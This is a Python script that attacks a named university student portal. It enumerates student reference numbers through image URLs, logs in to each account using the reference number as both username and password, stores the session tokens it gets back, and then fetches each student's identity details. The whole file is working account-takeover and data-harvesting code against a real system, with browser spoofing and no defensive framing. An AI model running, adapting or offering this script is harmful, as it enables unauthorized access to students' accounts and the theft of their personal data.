import json
import os
from typing import List, Tuple

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

from rich.console import Console
from rich.progress import (
    Progress,
    SpinnerColumn,
    TextColumn,
    BarColumn,
    TaskProgressColumn,
    TimeElapsedColumn,
    TimeRemainingColumn,
)

# Paths
ROOT = os.path.dirname(os.path.abspath(__file__))
REF_FILE = os.path.join(ROOT, 'ref.json')
VALID_OUT = os.path.join(ROOT, 'valid_ref.json')
INVALID_OUT = os.path.join(ROOT, 'invalid_ref.json')
CONFIRMED_OUT = os.path.join(ROOT, 'confirmed_refs.json')
VALID_USER_OUT = os.path.join(ROOT, 'valid_user.json')
NON_USER_OUT = os.path.join(ROOT, 'non_user.json')

LOGIN_URL = 'https://student.umat.edu.gh/api/UserAccount/login'
USERINFO_URL = 'https://student.umat.edu.gh/api/Account/UserInfo/StudentPortal'

# HTTP session with retries
def build_session(timeout: float = 10.0) -> requests.Session:
    session = requests.Session()
    retries = Retry(
        total=3,
        backoff_factor=0.5,
        status_forcelist=[429, 500, 502, 503, 504],
        allowed_methods=["HEAD", "GET", "POST", "OPTIONS"],
        raise_on_status=False,
    )
    adapter = HTTPAdapter(max_retries=retries, pool_connections=20, pool_maxsize=50)
    session.mount('http://', adapter)
    session.mount('https://', adapter)
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                      'AppleWebKit/537.36 (KHTML, like Gecko) '
                      'Chrome/124.0 Safari/537.36',
        'Accept': 'image/avif,image/webp,image/apng,image/*,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
    })
    session.request_timeout = timeout  # custom attr
    return session


def load_refs() -> tuple[str, str, List[str]]:
    with open(REF_FILE, 'r', encoding='utf-8') as f:
        data = json.load(f)
    base_url = data.get('base_url')
    ext = data.get('extension', '')
    refs = data.get('refs', [])
    if not base_url or not isinstance(refs, list):
        raise ValueError('ref.json missing base_url or refs list')
    return base_url.rstrip('/'), ext, [str(r).strip() for r in refs if str(r).strip()]


def check_ref(session: requests.Session, base_url: str, ext: str, ref: str) -> Tuple[str, bool, int]:
    url = f"{base_url}/{ref}{ext}"
    try:
        resp = session.head(url, timeout=session.request_timeout, allow_redirects=True)
        if resp.status_code == 405:  # Method Not Allowed -> fall back to GET
            resp.close()
            resp = session.get(url, timeout=session.request_timeout, stream=True)
        status = resp.status_code
        resp.close()
        return ref, (status == 200), status
    except requests.RequestException:
        return ref, False, 0


def confirm_ref(session: requests.Session, ref: str) -> Tuple[str, bool, int, bool, str]:
    """Return (ref, confirmed, status, token_present, token). Confirmed only when token is non-empty."""
    headers = {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Connection': 'keep-alive',
        'User-Agent': session.headers.get('User-Agent', 'Mozilla/5.0'),
    }
    payload = {"username": ref, "password": ref}
    token = ''
    try:
        resp = session.post(LOGIN_URL, json=payload, headers=headers, timeout=session.request_timeout)
        status = resp.status_code
        try:
            data = resp.json()
            token = data.get('token') if isinstance(data, dict) else ''
        except ValueError:
            token = ''
        finally:
            resp.close()
        token_present = isinstance(token, str) and token.strip() != ''
        confirmed = (status == 200 and token_present)
        return ref, confirmed, status, token_present, (token or '')
    except requests.RequestException:
        return ref, False, 0, False, ''


def fetch_user_info(session: requests.Session, token: str) -> Tuple[int, dict | None]:
    """Return (status_code, json_data_or_none) using provided JWT token."""
    headers = {
        'Accept': 'application/json',
        'Authorization': f'Bearer {token}',
        'Connection': 'keep-alive',
        'User-Agent': session.headers.get('User-Agent', 'Mozilla/5.0'),
    }
    try:
        resp = session.get(USERINFO_URL, headers=headers, timeout=session.request_timeout)
        status = resp.status_code
        try:
            data = resp.json()
        except ValueError:
            data = None
        finally:
            resp.close()
        return status, data
    except requests.RequestException:
        return 0, None


def is_real_user(data: dict | None) -> bool:
    if not isinstance(data, dict):
        return False
    # Core identity fields that should be present for real users
    keys = ['firstName', 'lastName', 'studentNumber', 'indexNumber', 'fullName']
    for k in keys:
        v = data.get(k)
        if isinstance(v, str) and v.strip():
            return True
        if k in ('yearGroup', 'level') and isinstance(v, int) and v > 0:
            return True
    return False


def save_json(path: str, payload) -> None:
    with open(path, 'w', encoding='utf-8') as f:
        json.dump(payload, f, indent=2)


def main() -> None:
    console = Console()
    base_url, ext, refs = load_refs()
    session = build_session()

    valid: List[str] = []
    invalid: List[str] = []
    results = []

    # Stage 1: Image existence check
    progress = Progress(
        SpinnerColumn(style="cyan"),
        TextColumn("[bold cyan]Checking images[/]"),
        BarColumn(bar_width=None),
        TaskProgressColumn(),
        TimeElapsedColumn(),
        TimeRemainingColumn(),
        console=console,
        transient=False,
    )

    with progress:
        task = progress.add_task("refs", total=len(refs))
        for ref in refs:
            r, is_valid, status = check_ref(session, base_url, ext, ref)
            results.append({"ref": r, "status": status, "url": f"{base_url}/{r}{ext}"})

            if is_valid:
                valid.append(r)
                progress.console.print(f"[green]✔[/] {r} -> [bold]200 OK[/]")
            else:
                status_text = "0 (error)" if status == 0 else str(status)
                progress.console.print(f"[red]✘[/] {r} -> [bold]{status_text}[/]")

            progress.advance(task)

    save_json(VALID_OUT, {"valid_refs": valid, "count": len(valid)})
    save_json(INVALID_OUT, {"invalid_refs": invalid, "count": len(invalid)})
    save_json(os.path.join(ROOT, 'ref_check_results.json'), {"results": results})

    console.print()
    console.print(f"[bold]Stage 1 complete[/]: {len(refs)} checked -> [green]{len(valid)} valid[/], [red]{len(invalid)} invalid[/]")

    # Stage 2: Confirm via login POST (token must be non-empty)
    confirmed: List[str] = []
    tokens_by_ref: dict[str, str] = {}
    confirm_results = []

    if valid:
        progress2 = Progress(
            SpinnerColumn(style="magenta"),
            TextColumn("[bold magenta]Confirming via login[/]"),
            BarColumn(bar_width=None),
            TaskProgressColumn(),
            TimeElapsedColumn(),
            TimeRemainingColumn(),
            console=console,
            transient=False,
        )
        with progress2:
            task2 = progress2.add_task("confirm", total=len(valid))
            for ref in valid:
                r, ok, status, token_present, token = confirm_ref(session, ref)
                confirm_results.append({"ref": r, "status": status, "token_present": token_present})
                if ok:
                    confirmed.append(r)
                    tokens_by_ref[r] = token
                    progress2.console.print(f"[green]✔[/] {r} -> [bold]200 OK[/] [green](token present)[/]")
                else:
                    if status == 200 and not token_present:
                        progress2.console.print(f"[yellow]![/] {r} -> 200 OK but [bold]empty token[/]")
                    else:
                        status_text = "0 (error)" if status == 0 else str(status)
                        progress2.console.print(f"[red]✘[/] {r} -> [bold]{status_text}[/]")
                progress2.advance(task2)

    save_json(CONFIRMED_OUT, {"confirmed_refs": confirmed, "count": len(confirmed)})
    save_json(os.path.join(ROOT, 'confirm_results.json'), {"results": confirm_results})

    console.print()
    console.print(f"[bold]Stage 2 complete[/]: [green]{len(confirmed)} confirmed[/] out of {len(valid)} valid")

    # Stage 3: Validate real user via UserInfo endpoint with token
    valid_users: List[str] = []
    non_users: List[str] = []
    userinfo_results = []

    if confirmed:
        progress3 = Progress(
            SpinnerColumn(style="green"),
            TextColumn("[bold green]Verifying user info[/]"),
            BarColumn(bar_width=None),
            TaskProgressColumn(),
            TimeElapsedColumn(),
            TimeRemainingColumn(),
            console=console,
            transient=False,
        )
        with progress3:
            task3 = progress3.add_task("userinfo", total=len(confirmed))
            for ref in confirmed:
                token = tokens_by_ref.get(ref, '')
                status, data = fetch_user_info(session, token)
                exists = (status == 200 and is_real_user(data))
                userinfo_results.append({
                    "ref": ref,
                    "status": status,
                    "exists": exists,
                })
                if exists:
                    valid_users.append(ref)
                    progress3.console.print(f"[green]✔[/] {ref} -> user info OK")
                else:
                    progress3.console.print(f"[yellow]![/] {ref} -> 200 but null data or fetch error")
                    non_users.append(ref)
                progress3.advance(task3)

    save_json(VALID_USER_OUT, {"valid_users": valid_users, "count": len(valid_users)})
    save_json(NON_USER_OUT, {"non_users": non_users, "count": len(non_users)})
    save_json(os.path.join(ROOT, 'user_info_results.json'), {"results": userinfo_results})

    console.print()
    console.print(f"[bold]Stage 3 complete[/]: [green]{len(valid_users)} valid users[/], [yellow]{len(non_users)} non-users[/]")
    console.print(f"Saved valid users to [bold]{VALID_USER_OUT}[/]")


if __name__ == '__main__':
    main()
